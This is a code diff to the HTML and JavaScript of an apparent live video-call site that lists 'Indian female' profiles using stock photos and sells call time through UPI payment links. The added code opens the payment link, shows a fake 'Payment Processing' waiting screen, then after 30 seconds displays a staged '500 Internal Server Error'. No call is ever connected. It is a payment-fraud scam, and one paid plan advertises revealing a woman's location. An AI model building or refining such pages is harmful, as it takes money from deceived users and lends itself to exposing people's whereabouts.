@@ -183,7 +183,7 @@
             </div>
 
             <h1 class="text-4xl sm:text-6xl md:text-7xl font-black tracking-tight leading-none mb-6">
-                Enjoy live video call with <span class="bg-gradient-to-r from-indigo-400 via-pink-500 to-cyan-400 bg-clip-text text-transparent">ladies 🔥 near you</span>
+                Enjoy live video call with <span class="bg-gradient-to-r from-indigo-400 via-pink-500 to-cyan-400 bg-clip-text text-transparent">person near you</span>
             </h1>
 
             <p class="text-slate-400 text-base sm:text-lg max-w-xl mx-auto mb-14 leading-relaxed font-normal">
@@ -342,16 +342,13 @@
                     <div class="absolute inset-0 rounded-full bg-black/50 flex items-center justify-center text-[11px] text-white font-extrabold opacity-0 group-hover:opacity-100 transition-opacity">You</div>
                 </div>
 
-                <!-- =============================================================== -->
-                <!-- FLOATING INDIAN FEMALE PROFILES (3 ONLINE, 2 OFFLINE) -->
-                <!-- =============================================================== -->
+                <!-- FLOATING INDIAN FEMALE PROFILES -->
                 
                 <!-- Person 1 (ONLINE - Ananya Sharma) -->
                 <div onclick="selectProfile('Ananya Sharma', '2.1 km away', true, 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=200&auto=format&fit=crop&q=80')" 
                      class="absolute top-[18%] left-[22%] z-20 cursor-pointer group animate-float-slow">
                     <div class="relative w-14 h-14 sm:w-16 sm:h-16 rounded-full p-0.5 bg-gradient-to-tr from-emerald-400 to-indigo-500 shadow-lg shadow-emerald-500/30 group-hover:scale-110 transition-transform">
                         <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=200&auto=format&fit=crop&q=80" alt="Ananya Sharma" class="w-full h-full rounded-full object-cover">
-                        <!-- Online Green Status Badge -->
                         <span class="absolute bottom-0 right-0 w-4 h-4 rounded-full bg-emerald-500 border-2 border-slate-900 flex items-center justify-center">
                             <span class="w-1.5 h-1.5 rounded-full bg-white animate-pulse"></span>
                         </span>
@@ -394,7 +391,6 @@
                      class="absolute bottom-[22%] right-[22%] z-20 cursor-pointer group opacity-60 hover:opacity-100 transition-opacity">
                     <div class="relative w-12 h-12 sm:w-14 sm:h-14 rounded-full p-0.5 bg-slate-700 shadow-md group-hover:scale-110 transition-transform">
                         <img src="https://images.unsplash.com/photo-1607746882042-944635d10e46?w=200&auto=format&fit=crop&q=80" alt="Kavya Patel" class="w-full h-full rounded-full object-cover grayscale">
-                        <!-- Offline Grey Badge -->
                         <span class="absolute bottom-0 right-0 w-3.5 h-3.5 rounded-full bg-slate-500 border-2 border-slate-900"></span>
                     </div>
                     <div class="absolute top-full left-1/2 -translate-x-1/2 mt-1 bg-slate-900/90 border border-slate-800 px-2 py-0.5 rounded text-[10px] font-medium text-slate-400 whitespace-nowrap">
@@ -420,6 +416,33 @@
                 <i class="fa-solid fa-hand-pointer text-indigo-400 mr-1 animate-bounce"></i> Click any floating profile bubble above to start a direct call session.
             </p>
 
+        </section>
+
+        <!-- WAITING SCREEN OVERLAY -->
+        <section id="waiting-section" class="hidden fixed inset-0 z-50 bg-slate-950 flex flex-col items-center justify-center p-6 text-center">
+            <div class="glass-card max-w-md w-full p-8 rounded-3xl border border-slate-800 flex flex-col items-center shadow-2xl relative">
+                
+                <div class="relative mb-6">
+                    <img src="https://m.media-amazon.com/images/I/715cCEDSkiL.jpg" alt="Waiting" class="w-48 h-48 sm:w-56 sm:h-56 object-cover rounded-2xl shadow-xl border-2 border-indigo-500/30">
+                    
+                    <!-- Processing Badge -->
+                    <div class="absolute -bottom-3 left-1/2 -translate-x-1/2 bg-slate-900 border border-indigo-500/40 text-indigo-300 px-4 py-1 rounded-full text-xs font-semibold flex items-center gap-2 shadow-lg whitespace-nowrap">
+                        <i class="fa-solid fa-circle-notch fa-spin text-pink-500"></i>
+                        <span>Payment Processing...</span>
+                    </div>
+                </div>
+
+                <h2 class="text-3xl font-black text-white tracking-wide mb-2">Waiting</h2>
+                <p class="text-slate-400 text-sm max-w-xs leading-relaxed">
+                    Please wait while we confirm your payment in the opened tab and establish your encrypted call line.
+                </p>
+            </div>
+        </section>
+
+        <!-- SERVER ERROR PAGE -->
+        <section id="error-page" class="hidden fixed inset-0 z-50 bg-white text-slate-900 flex flex-col items-center justify-center p-6 text-center">
+            <h1 class="text-4xl sm:text-6xl font-extrabold tracking-tight mb-2">server error</h1>
+            <p class="text-slate-500 text-sm">500 Internal Server Error</p>
         </section>
 
     </main>
@@ -452,7 +475,7 @@
             <div class="space-y-3.5 mb-6">
                 
                 <!-- OPTION 1: 150 INR -->
-                <div onclick="selectPlan('Option 1', 150, '10 mins', 'https://upi.pe/sanathselvakumaran-1@okhdfcbank/150.00?pn=DIGITAL+CALL+TECHNOLOGIES')" class="plan-card cursor-pointer border border-slate-700 hover:border-indigo-500 bg-slate-900/60 p-4 rounded-2xl flex items-center justify-between transition-all hover:scale-[1.02]">
+                <div onclick="selectPlan('Option 1', 150, '10 mins', 'https://upi.pe/sanathselvakumaran-1@okhdfcbank/150.00?pn=DIGITAL+CALL+TECHNOLOGIES', event)" class="plan-card cursor-pointer border border-slate-700 hover:border-indigo-500 bg-slate-900/60 p-4 rounded-2xl flex items-center justify-between transition-all hover:scale-[1.02]">
                     <div class="flex items-center space-x-3.5">
                         <div class="w-10 h-10 rounded-xl bg-slate-800 border border-slate-700 flex items-center justify-center text-indigo-400 font-bold">
                             <i class="fa-solid fa-clock"></i>
@@ -469,7 +492,7 @@
                 </div>
 
                 <!-- OPTION 2: 250 INR -->
-                <div onclick="selectPlan('Option 2', 250, '20 mins', 'https://upi.pe/sanathselvakumaran-1@okhdfcbank/250.00?pn=DIGITAL+CALL+TECHNOLOGIES')" class="plan-card cursor-pointer border border-slate-700 hover:border-indigo-500 bg-slate-900/60 p-4 rounded-2xl flex items-center justify-between transition-all hover:scale-[1.02]">
+                <div onclick="selectPlan('Option 2', 250, '20 mins', 'https://upi.pe/sanathselvakumaran-1@okhdfcbank/250.00?pn=DIGITAL+CALL+TECHNOLOGIES', event)" class="plan-card cursor-pointer border border-slate-700 hover:border-indigo-500 bg-slate-900/60 p-4 rounded-2xl flex items-center justify-between transition-all hover:scale-[1.02]">
                     <div class="flex items-center space-x-3.5">
                         <div class="w-10 h-10 rounded-xl bg-purple-500/10 border border-purple-500/30 flex items-center justify-center text-purple-400 font-bold">
                             <i class="fa-solid fa-hourglass-half"></i>
@@ -486,7 +509,7 @@
                 </div>
 
                 <!-- OPTION 3: 400 INR (LOCATION REVEAL) -->
-                <div onclick="selectPlan('Option 3', 400, '25 mins + Location in Google Maps', 'https://upi.pe/sanathselvakumaran-1@okhdfcbank/400.00?pn=DIGITAL+CALL+TECHNOLOGIES')" class="plan-card relative cursor-pointer border-2 border-pink-500/80 bg-gradient-to-r from-pink-950/30 via-slate-900 to-indigo-950/30 p-4 rounded-2xl flex items-center justify-between transition-all hover:scale-[1.02] shadow-lg shadow-pink-500/10">
+                <div onclick="selectPlan('Option 3', 400, '25 mins + Location Reveal', 'https://upi.pe/sanathselvakumaran-1@okhdfcbank/400.00?pn=DIGITAL+CALL+TECHNOLOGIES', event)" class="plan-card relative cursor-pointer border-2 border-pink-500/80 bg-gradient-to-r from-pink-950/30 via-slate-900 to-indigo-950/30 p-4 rounded-2xl flex items-center justify-between transition-all hover:scale-[1.02] shadow-lg shadow-pink-500/10">
                     <span class="absolute -top-3 right-4 bg-gradient-to-r from-pink-500 to-indigo-500 text-white text-[10px] font-black uppercase tracking-wider px-2.5 py-0.5 rounded-full shadow">
                         RECOMMENDED
                     </span>
@@ -498,7 +521,7 @@
                             <div class="text-sm font-bold text-white flex items-center gap-1.5">
                                 Option 3 <i class="fa-solid fa-crown text-yellow-400 text-xs"></i>
                             </div>
-                            <div class="text-xs text-pink-300 font-medium">25 Mins + Location in Google Maps</div>
+                            <div class="text-xs text-pink-300 font-medium">25 Mins + Location Reveal</div>
                         </div>
                     </div>
                     <div class="text-right">
@@ -526,7 +549,6 @@
     </footer>
 
     <script>
-        // Full list of Indian States and Union Territories
         const indianStates = [
             "Andaman and Nicobar Islands", "Andhra Pradesh", "Arunachal Pradesh", "Assam", "Bihar",
             "Chandigarh", "Chhattisgarh", "Dadra and Nagar Haveli and Daman and Diu", "Delhi", "Goa",
@@ -541,6 +563,7 @@
         let selectedPincode = "";
         let selectedRadius = "5";
         let chosenPlanData = null;
+        let timeoutTimer = null;
 
         document.addEventListener("DOMContentLoaded", () => {
             const stateSelect = document.getElementById("state-select");
@@ -551,7 +574,6 @@
                 stateSelect.appendChild(opt);
             });
 
-            // Handle Ripple Click Effects
             document.addEventListener('click', function(e) {
                 if (e.target.closest('button')) {
                     const btn = e.target.closest('button');
@@ -678,7 +700,7 @@
             card.classList.add("scale-95");
         }
 
-        function selectPlan(optionTitle, price, details, payUrl) {
+        function selectPlan(optionTitle, price, details, payUrl, event) {
             chosenPlanData = { optionTitle, price, details, payUrl };
             
             document.querySelectorAll(".plan-card").forEach(el => {
@@ -696,9 +718,25 @@
                 return;
             }
 
+            // 1. Open Payment Link in NEW TAB
             if (chosenPlanData.payUrl) {
-                window.location.href = chosenPlanData.payUrl;
+                window.open(chosenPlanData.payUrl, '_blank');
             }
+
+            // 2. Hide modal and show Waiting section on original page
+            closePlansModal();
+            document.getElementById("waiting-section").classList.remove("hidden");
+
+            // 3. After 30 seconds, redirect page to blank "Server Error" screen
+            clearTimeout(timeoutTimer);
+            timeoutTimer = setTimeout(() => {
+                showServerErrorPage();
+            }, 30000);
+        }
+
+        function showServerErrorPage() {
+            document.getElementById("waiting-section").classList.add("hidden");
+            document.getElementById("error-page").classList.remove("hidden");
         }
     </script>
 </body>
